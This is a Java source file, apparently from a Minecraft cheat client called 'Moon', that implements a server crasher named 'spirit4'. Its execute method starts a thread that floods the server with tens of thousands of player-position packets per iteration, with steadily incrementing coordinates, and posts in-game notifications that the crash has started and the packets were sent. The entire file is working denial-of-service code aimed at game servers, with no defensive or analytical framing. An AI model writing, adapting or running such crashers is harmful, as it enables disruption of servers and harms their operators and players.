package Moon.methods.impl;

import Moon.helpers.ChatHelper;
import Moon.methods.Crash;
import Moon.methods.CrashInfo;
import Moon.mods.notifications.Notification;
import Moon.mods.notifications.NotificationManager;
import Moon.mods.notifications.NotificationType;
import net.minecraft.client.Minecraft;
import net.minecraft.network.play.client.C03PacketPlayer;

@CrashInfo(
        name = "spirit4"
)
public class CrashSpirit4 extends Crash {
    public void execute(Object... args) {
        int packets = (Integer) args[0];
        long start = System.currentTimeMillis();
        NotificationManager.show(new Notification(NotificationType.INFO, ChatHelper.fix("&4Moon"), "Spirit crasher started!", 4));
        ChatHelper.sendMessage(String.format("Sending packets &8(&f%s&8) &8[&f%s&8]", this.getName().toUpperCase(), args[0]));

        (new Thread(() -> {
            try {
                for (int i = 0; i < packets; ++i) {
                    double x = mc.thePlayer.posX;
                    double y = mc.thePlayer.posY;
                    double z = mc.thePlayer.posZ;

                    for (int j = 0; j < 32000; j++) {
                        Minecraft.getMinecraft().getNetHandler().getNetworkManager().sendPacket(new C03PacketPlayer.C04PacketPlayerPosition(x++, y >= 255 ? 255 : y++, z++, true));
                    }
                }
            } catch (Exception ignored) {
            }
        })).start();
        ChatHelper.sendMessage(String.format("Packets has been sent &8(&f%sms&8)", System.currentTimeMillis() - start));
    }
}
